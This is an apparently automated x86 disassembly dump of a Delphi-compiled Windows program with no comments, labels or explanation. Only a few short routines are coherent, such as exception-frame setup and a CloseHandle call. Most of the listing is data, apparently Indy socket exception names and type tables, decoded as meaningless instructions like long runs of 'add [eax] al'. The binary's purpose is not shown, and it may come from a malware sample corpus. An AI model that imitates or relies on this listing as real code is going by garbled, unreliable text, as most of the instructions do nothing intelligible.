mov ebp esp
xor eax eax
push ebp
push sub_45478b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454792
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_44a188
mov eax sub_44a408
call sub_413394
mov eax [ rw-data ]
push eax
call CloseHandle
sub_4547dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x48
inc ebp
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax * 2 + 0x78456449 ] cl
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
outsd
outsb
lea eax [ eax ]
or [ eax + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x45 ] 0x0
or al 0x0
add [ eax ] al
fadd [ edi + 0x45 ]
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] dl
inc ebp
dec ecx
push ebx
imul ebp [ ebp + 0x6e ] 0x63784574
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
xor al 0x48
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
dec ecx
inc ebp
imul ebp [ edi + 0x6e ] 0x4548e090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
dec eax
dec esi
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
je r-xdata
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ecx [ edx + 0x45 ]
mov eax eax
dec edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 + 0x45 ] ah
add [ eax + eax ] cl
add [ eax ] al
fadd [ edi + 0x45 ]
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] dl
inc ebp
dec ecx
insb
dec ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004549 ] ah
arpl [ ebp + 0x66 ] sp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
dec ebx
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax + eax ] cl
add [ eax ] al
fadd [ edi + 0x45 ]
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x53644945 ] cl
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
outsd
outsb
les ecx [ edx + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
dec edx
inc ebp
xor [ eax ] al
loopne r-xdata
add [ eax + eax ] cl
add [ eax ] al
fadd [ edi + 0x45 ]
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
dec ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x45 ] al
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
popad
insd
mov eax eax
add al 0x4a
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
fadd [ edi + 0x45 ]
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] dl
inc ebp
dec ecx
inc ebx
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
dec esi
add [ eax ] al
add al bl
inc edi
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x49644945 ] dl
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
inc eax
add al ah
xor [ eax ] al
adc eax [ ebp + 0x49 ]
shl [ eax ] 0x4b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx + 0x45 ] cl
add [ eax + eax ] cl
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x53644945 ] dl
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
add [ eax ] al
mov al [ 0xc004549 ]
inc eax
add [ edi ] cl
inc ebp
dec ecx
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
nop
jae r-xdata
dec ebx
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc00454c
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
add [ eax ] al
add [ eax + 0x4a ] bh
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
inc ebp
add [ eax ] al
jae r-xdata
push esp
dec esp
inc ebp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x4b84c08b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 2 + 0xc0045 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
dec ebp
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x4d
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] dl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
inc eax
add al ah
xor [ eax ] al
pop ss
jae r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebp + 0x45 ] cl
add [ eax + eax ] cl
inc ebp
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] dl
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00454c ] bh
inc eax
add [ eax + 0x454c ] bh
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax * 2 + 0x6f536449 ] dl
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 + 0x45 ] dl
popad
imul ebp [ ebp + 0x64 ] 0x454c5490
xor [ eax ] al
movsb [ edi ] [ esi ]
xor [ eax ] al
loopne r-xdata
popad
imul ebp [ ebp + 0x64 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
dec esi
inc ebp
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6f727245
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
outsd
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
dec esp
inc ebp
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc00454e
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
jb r-xdata
jb r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
shl ah 0x4d
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
dec ebp
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0xc0045 ] al
outsd
jb r-xdata
push ebp
outsb
jb r-xdata
jb r-xdata
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
dec ebp
inc ebp
inc ebp
jb r-xdata
and [ ebp + 0x45 ] cl
add [ eax ] al
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
je r-xdata
jb r-xdata
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
jb r-xdata
shr [ eax ] 0x4f
inc ebp
jb r-xdata
sar [ eax + 0x454e ] 0x0
add [ eax ] al
jb r-xdata
insb
inc ebp
jb r-xdata
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
outsd
jb r-xdata
outsd
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
movsb [ edi ] [ esi ]
xor [ eax ] al
loopne r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
dec edi
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
sub [ edi + 0x45 ] cl
cwde
dec edi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00454f ] bl
add [ eax ] al
add [ eax + 0x4a ] bh
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
mov eax eax
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
add [ eax ] al
add [ eax + 0x4a ] bh
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00454e ] bh
outsd
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
outsd
outsb
outsb
nop
inc eax
add [ eax + edx * 2 ] cl
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax * 2 + 0x6f536449 ] ah
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
xor [ ebx ] dh
inc eax
add [ ebx + esi ] dh
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
dec edi
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc eax
add [ edx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
popad
push esp
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 2 ] cl
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
or al 0x50
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
dec esp
dec esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x51 ] cl
outsd
jb r-xdata
movsb [ edi ] [ esi ]
xor [ eax ] al
loopne r-xdata
push esp
dec esp
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc ebp
sar [ eax + 0x50 ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x50 ] bh
push eax
inc ebp
outsb
push edx
jne r-xdata
outsd
imul esi [ edx + 0x65 ] 0x72724564
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
inc ebp
jb r-xdata
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
pop ebx
pop ebp
retn 0x4
jb r-xdata
add [ eax ] al
add [ eax ] al
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
push eax
inc ebp
add [ eax + eax ] cl
add [ eax ] al
fadd [ edi + 0x45 ]
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
add [ eax ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
nop
jb r-xdata
in eax 0xfa
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
push ecx
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
add [ ebx + esi ] dh
outsd
insd
insd
popad
outsb
jbe r-xdata
dec ecx
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax ] dl
inc ebp
dec ecx
dec ecx
jb r-xdata
lea eax [ eax ]
test al 0x51
inc ebp
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x100045 ] ch
add [ eax ] al
fadd [ edi + 0x45 ]
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx + edx * 2 + 0x450e0045 ] bh
dec ecx
push ebx
outsd
jb r-xdata
outsb
inc ebp
dec eax
push ecx
inc ebp
add [ eax ] al
add [ eax ] al
sub_4551bc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b1c0
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_455204
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_455229
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455230
retn
sub_45523c
xchg [ fs : esi ] al
or al 0xff
add [ eax ] al
xchg [ fs : esi ] al
or eax 0x640000ff
xchg [ esi ] al
push cs
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
